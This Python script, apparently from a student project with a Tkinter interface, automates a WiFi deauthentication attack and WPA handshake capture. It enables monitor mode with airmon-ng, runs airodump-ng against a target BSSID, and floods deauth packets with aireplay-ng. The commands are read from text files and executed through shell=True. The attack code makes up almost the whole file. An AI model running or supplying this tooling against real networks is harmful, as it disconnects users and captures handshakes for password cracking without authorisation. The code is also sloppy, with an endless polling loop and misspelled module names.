
#======================
# imports
#======================

import signal
import sys
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import Menu
from tkinter import Spinbox
from tkinter import messagebox as mBox
import threading
import wifiadpater as fypad
import scannningnetwork as sca
import shlex
import time
import configparser
import signal
import threading
import multiprocessing as mp
import os, subprocess
import shutil
#from PIL import Image, ImageTk
from PIL import Image
from PIL import ImageTk
from itertools import count 
from tkinter.filedialog import askopenfilename
import gif
from tkinter import *
from tkinter.ttk import *
import schedule
import main




def dellink():
            delinkfalagopen=open("delinkfalag.txt","w+")
            delinktxtopen1=open("delink.txt","r")
            read= delinktxtopen1.read()
            print(read)
            tvlist=read.split("\n")

            dostxtopen=open("dos.txt","r")
            read1= dostxtopen.read()
            print(read1)
            tvlist1=read1.split("\n")
            print("en"+tvlist[0])
            print("e"+tvlist1[0])
            def airodump_ch():

                en=tvlist[0]
                #en="airodump-ng -c "+ delinkairCH+" --bssid "+delinkbssid+" -w /root/fyp/de-link  "+ selectwaln 
                print ("")
                print( en)
                
                #e="gnome-terminal -x "+en

                doshand_txt=open("doshand.txt",'w+')
                
                #airodump_chp=subprocess.getoutput(en)
                airodump_chp = subprocess.Popen(en,shell=True,stdout=doshand_txt, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
                print (airodump_chp)
                global dosloop_num
                dosloop_num=0
                while dosloop_num==0:
                        shutil.copyfile('doshand.txt','doshandout.txt')
                        dosout=open("doshandout.txt",'r')
                        for n in dosout:
                            if 'handshake:' in n:
                                print ('success')
                                delinkfalagopen.write('aaa')
                                delinkfalagopen.close()
                                break
                            
                            
                                
                print ("Label")
                #doshandlabel=ttk.Label(tab2run, text="handshake get")
                #doshandlabel.grid(column=0, row=2, padx=8, pady=4)
                #doshandlabel.config(font=("Courier", 15))  
                

            def aireplay_ddos():
                e=tvlist1[0]
                #e="aireplay-ng -0 20 -a "+ delinkbssid+" -c "+ delinkstation +"  "+ selectwaln
                print ("start")
                print (e)
                subprocess.Popen(e,shell=True)
                #p = subprocess.Popen(e,shell=True ,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, preexec_fn=os.setsid)

                
                

            #airodump_ch()
            #time.sleep(3)
            #aireplay_ddos()
            
            
            
                    
            

            thread_1 = threading.Thread(target=airodump_ch)
            print ("start 1")
            thread_2 = threading.Thread(target=aireplay_ddos)
            print ("start 2")
            thread_1.start() # start T1
            print ("start 1.1")
            time.sleep(2)
            thread_2.start() # start T2
            
            thread_2.join()
            thread_1.join()
            
            
os.system("airmon-ng start wlan0")
dellink()

